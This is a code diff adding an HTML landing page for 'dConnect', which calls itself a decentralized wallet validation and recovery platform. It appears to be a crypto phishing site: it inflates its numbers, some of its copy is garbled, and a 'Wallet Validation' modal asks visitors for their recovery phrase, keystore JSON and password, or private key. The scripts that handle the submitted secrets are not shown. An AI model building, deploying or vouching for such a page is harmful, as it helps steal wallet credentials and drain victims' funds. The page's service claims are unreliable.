@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>dConnect - Decentralized Wallet Platform</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/components.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p>Connecting to blockchain...</p>
+    </div>
+
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <img src="images/logo.png" alt="dConnect Logo" id="logo-img">
+                    <h1>dConnect</h1>
+                </div>
+                <nav class="main-nav">
+                    <ul>
+                        <li><a href="#about">About</a></li>
+                        <li><a href="#services">Services</a></li>
+                        <li><a href="#solutions">Solutions</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                    </ul>
+                </nav>
+                <div class="header-actions">
+                    <button class="btn btn-outline" id="connectWalletBtn">Connect Wallet</button>
+                    <button class="menu-toggle" id="menuToggle">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="mobile-menu" id="mobileMenu">
+        <ul>
+            <li><a href="#about">About</a></li>
+            <li><a href="#services">Services</a></li>
+            <li><a href="#solutions">Solutions</a></li>
+            <li><a href="#contact">Contact</a></li>
+            <li><button class="btn btn-primary">Connect Wallet</button></li>
+        </ul>
+    </div>
+
+    <main>
+        <section class="hero">
+            <div class="container">
+                <div class="hero-content">
+                    <h1>Decentralized Wallet Platform</h1>
+                    <p>A powerful tool for wallet validation that solves all crypto wallet related issues</p>
+                    <div class="hero-cta">
+                        <button class="btn btn-primary btn-lg" id="validateWallet">Validate Wallet</button>
+                        <button class="btn btn-outline btn-lg" id="learnMore">Learn More</button>
+                    </div>
+                </div>
+                <div class="hero-image">
+                    <img src="images/hero-wallet.png" alt="Wallet illustration">
+                </div>
+            </div>
+            <div class="hero-stats">
+                <div class="container">
+                    <div class="stats-container">
+                        <div class="stat-item">
+                            <h3>100+</h3>
+                            <p>Supported Wallets</p>
+                        </div>
+                        <div class="stat-item">
+                            <h3>4M+</h3>
+                            <p>Users Worldwide</p>
+                        </div>
+                        <div class="stat-item">
+                            <h3>99.9%</h3>
+                            <p>Recovery Rate</p>
+                        </div>
+                        <div class="stat-item">
+                            <h3>24/7</h3>
+                            <p>Support Available</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="services" id="services">
+            <div class="container">
+                <div class="section-header">
+                    <h2>Our Services</h2>
+                    <p>Complete solutions for all your crypto wallet needs</p>
+                </div>
+                <div class="services-grid">
+                    <div class="service-card" id="rectification">
+                        <div class="service-icon">
+                            <i class="fas fa-tools"></i>
+                        </div>
+                        <h3>Rectification</h3>
+                        <p>Rectification support warranties completely decentralized</p>
+                        <a href="modules/rectification.html" class="service-link">Get Started <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                    <div class="service-card" id="validation">
+                        <div class="service-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3>Validation</h3>
+                        <p>Validation completely decentralized supports wallet</p>
+                        <a href="modules/validation.html" class="service-link">Get Started <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                    <div class="service-card" id="recovery">
+                        <div class="service-icon">
+                            <i class="fas fa-key"></i>
+                        </div>
+                        <h3>Recovery</h3>
+                        <p>Recovery wallet TATs Dapps with Blockchain and DeFi</p>
+                        <a href="modules/recovery.html" class="service-link">Get Started <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                    <div class="service-card" id="staking">
+                        <div class="service-icon">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                        <h3>Staking Pool</h3>
+                        <p>Combine computational resources to increase rewards chances</p>
+                        <a href="modules/staking.html" class="service-link">Get Started <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                    <div class="service-card" id="withdrawal">
+                        <div class="service-icon">
+                            <i class="fas fa-money-bill-wave"></i>
+                        </div>
+                        <h3>Withdrawal</h3>
+                        <p>Move cryptocurrency to external wallets you control</p>
+                        <a href="modules/withdrawal.html" class="service-link">Get Started <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                    <div class="service-card" id="migration">
+                        <div class="service-icon">
+                            <i class="fas fa-exchange-alt"></i>
+                        </div>
+                        <h3>Migration</h3>
+                        <p>Migrate tokens to a new contract safely and efficiently</p>
+                        <a href="modules/migration.html" class="service-link">Get Started <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="solutions" id="solutions">
+            <div class="container">
+                <div class="section-header">
+                    <h2>Complete Solutions</h2>
+                    <p>Comprehensive tools for managing your digital assets</p>
+                </div>
+                <div class="solutions-container">
+                    <div class="solutions-tabs">
+                        <button class="tab-btn active" data-tab="tokens">Add Tokens</button>
+                        <button class="tab-btn" data-tab="portfolio">Portfolio</button>
+                        <button class="tab-btn" data-tab="nfts">NFTs</button>
+                        <button class="tab-btn" data-tab="bridge">Bridge</button>
+                        <button class="tab-btn" data-tab="whitelist">Whitelist</button>
+                    </div>
+                    <div class="solutions-content">
+                        <div class="tab-content active" id="tokens-content">
+                            <div class="solution-info">
+                                <h3>Add Tokens</h3>
+                                <p>Crypto tokens represent an asset or specific use and reside on their own blockchain. Add custom tokens to your wallet with ease.</p>
+                                <a href="modules/tokens.html" class="btn btn-primary">Add Custom Token</a>
+                            </div>
+                            <div class="solution-image">
+                                <img src="images/tokens.png" alt="Add Tokens">
+                            </div>
+                        </div>
+                        <div class="tab-content" id="portfolio-content">
+                            <div class="solution-info">
+                                <h3>Update My Portfolio</h3>
+                                <p>Generate real-time profit and loss reports, track your coin values, and create reports for taxes and more.</p>
+                                <a href="modules/portfolio.html" class="btn btn-primary">View Portfolio</a>
+                            </div>
+                            <div class="solution-image">
+                                <img src="images/portfolio.png" alt="Portfolio Management">
+                            </div>
+                        </div>
+                        <div class="tab-content" id="nfts-content">
+                            <div class="solution-info">
+                                <h3>My NFTs</h3>
+                                <p>View your collection of digital works. Easily manage, transfer, and showcase your NFTs in one place.</p>
+                                <a href="modules/nfts.html" class="btn btn-primary">View Collection</a>
+                            </div>
+                            <div class="solution-image">
+                                <img src="images/nfts.png" alt="NFT Collection">
+                            </div>
+                        </div>
+                        <div class="tab-content" id="bridge-content">
+                            <div class="solution-info">
+                                <h3>Bridge</h3>
+                                <p>Connect applications built on different blockchains like Ethereum, BSC, Avalanche, and Polygon with our groundbreaking bridge protocol.</p>
+                                <a href="modules/bridge.html" class="btn btn-primary">Use Bridge</a>
+                            </div>
+                            <div class="solution-image">
+                                <img src="images/bridge.png" alt="Blockchain Bridge">
+                            </div>
+                        </div>
+                        <div class="tab-content" id="whitelist-content">
+                            <div class="solution-info">
+                                <h3>Whitelist</h3>
+                                <p>Get an early spot for minting. Join whitelists for upcoming projects and secure your position.</p>
+                                <a href="modules/whitelist.html" class="btn btn-primary">Join Whitelist</a>
+                            </div>
+                            <div class="solution-image">
+                                <img src="images/whitelist.png" alt="Whitelist Registration">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="wallet-connect" id="wallet-connect">
+            <div class="container">
+                <div class="wallet-connect-content">
+                    <h2>Connect Your Wallet</h2>
+                    <p>Securely connect your wallet to access all our services</p>
+                    <div class="wallets-grid">
+                        <div class="wallet-option" data-wallet="metamask">
+                            <img src="images/wallets/metamask.png" alt="MetaMask">
+                            <span>MetaMask</span>
+                        </div>
+                        <div class="wallet-option" data-wallet="trustwallet">
+                            <img src="images/wallets/trustwallet.png" alt="Trust Wallet">
+                            <span>Trust Wallet</span>
+                        </div>
+                        <div class="wallet-option" data-wallet="coinbase">
+                            <img src="images/wallets/coinbase.png" alt="Coinbase Wallet">
+                            <span>Coinbase</span>
+                        </div>
+                        <div class="wallet-option" data-wallet="walletconnect">
+                            <img src="images/wallets/walletconnect.png" alt="WalletConnect">
+                            <span>WalletConnect</span>
+                        </div>
+                        <div class="wallet-option" data-wallet="binance">
+                            <img src="images/wallets/binance.png" alt="Binance Chain Wallet">
+                            <span>Binance</span>
+                        </div>
+                        <div class="wallet-option" data-wallet="more">
+                            <div class="more-wallets-icon">
+                                <i class="fas fa-ellipsis-h"></i>
+                            </div>
+                            <span>More Wallets</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="validation-process" id="validation-process">
+            <div class="container">
+                <div class="section-header">
+                    <h2>Validation Process</h2>
+                    <p>Simple steps to validate and secure your wallet</p>
+                </div>
+                <div class="process-steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Connect Your Wallet</h3>
+                            <p>Securely connect your wallet to our platform</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Select Service</h3>
+                            <p>Choose the service you need from our offerings</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Verification</h3>
+                            <p>Complete the verification process</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">4</div>
+                        <div class="step-content">
+                            <h3>Problem Solved</h3>
+                            <p>Your wallet issues are resolved securely</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <img src="images/logo.png" alt="dConnect Logo">
+                    <h2>dConnect</h2>
+                </div>
+                <div class="footer-nav">
+                    <div class="footer-col">
+                        <h3>Services</h3>
+                        <ul>
+                            <li><a href="modules/rectification.html">Rectification</a></li>
+                            <li><a href="modules/validation.html">Validation</a></li>
+                            <li><a href="modules/recovery.html">Recovery</a></li>
+                            <li><a href="modules/staking.html">Staking Pool</a></li>
+                            <li><a href="modules/withdrawal.html">Withdrawal</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Solutions</h3>
+                        <ul>
+                            <li><a href="modules/tokens.html">Add Tokens</a></li>
+                            <li><a href="modules/portfolio.html">Portfolio</a></li>
+                            <li><a href="modules/nfts.html">NFTs</a></li>
+                            <li><a href="modules/bridge.html">Bridge</a></li>
+                            <li><a href="modules/whitelist.html">Whitelist</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Company</h3>
+                        <ul>
+                            <li><a href="#about">About</a></li>
+                            <li><a href="#contact">Contact</a></li>
+                            <li><a href="#privacy">Privacy</a></li>
+                            <li><a href="#terms">Terms</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 dConnect. All rights reserved.</p>
+                <div class="social-links">
+                    <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-discord"></i></a>
+                    <a href="#" class="https://t.me/keaGeeFx"><i class="fab fa-telegram"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-github"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div class="validation-modal" id="validationModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Wallet Validation</h2>
+                <button class="close-modal" id="closeModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="validation-form">
+                    <div class="form-group">
+                        <label for="walletType">Wallet Type</label>
+                        <select id="walletType" required>
+                            <option value="" disabled selected>Select your wallet type</option>
+                            <option value="metamask">MetaMask</option>
+                            <option value="trustwallet">Trust Wallet</option>
+                            <option value="coinbase">Coinbase Wallet</option>
+                            <option value="walletconnect">WalletConnect</option>
+                            <option value="binance">Binance Chain Wallet</option>
+                            <option value="other">Other</option>
+                        </select>
+                    </div>
+                    <div class="validation-options">
+                        <h3>Select Validation Method</h3>
+                        <div class="validation-option">
+                            <input type="radio" id="phrase" name="validationType" value="phrase">
+                            <label for="phrase">Recovery Phrase</label>
+                        </div>
+                        <div class="validation-option">
+                            <input type="radio" id="keystore" name="validationType" value="keystore">
+                            <label for="keystore">Keystore JSON</label>
+                        </div>
+                        <div class="validation-option">
+                            <input type="radio" id="private" name="validationType" value="private">
+                            <label for="private">Private Key</label>
+                        </div>
+                    </div>
+                    <div class="validation-inputs" id="phraseInput" style="display: none;">
+                        <div class="form-group">
+                            <label for="seedPhrase">Recovery Phrase</label>
+                            <textarea id="seedPhrase" placeholder="Enter your 12/24 word recovery phrase" rows="3"></textarea>
+                            <p class="input-hint">Typically 12 or 24 words separated by spaces</p>
+                        </div>
+                    </div>
+                    <div class="validation-inputs" id="keystoreInput" style="display: none;">
+                        <div class="form-group">
+                            <label for="keystoreJson">Keystore JSON</label>
+                            <textarea id="keystoreJson" placeholder="Enter your keystore JSON" rows="3"></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label for="keystorePassword">Keystore Password</label>
+                            <input type="password" id="keystorePassword" placeholder="Enter keystore password">
+                        </div>
+                    </div>
+                    <div class="validation-inputs" id="privateInput" style="display: none;">
+                        <div class="form-group">
+                            <label for="privateKey">Private Key</label>
+                            <input type="password" id="privateKey" placeholder="Enter your private key">
+                            <p class="input-hint">Typically 64 alphanumeric characters</p>
+                        </div>
+                    </div>
+                    <div class="form-actions">
+                        <button class="btn btn-primary btn-lg" id="validateBtn">Validate</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/main.js"></script>
+    <script src="js/validation.js"></script>
+    <script src="js/wallet.js"></script>
+    <script src="js/tabs.js"></script>
+</body>
+</html>
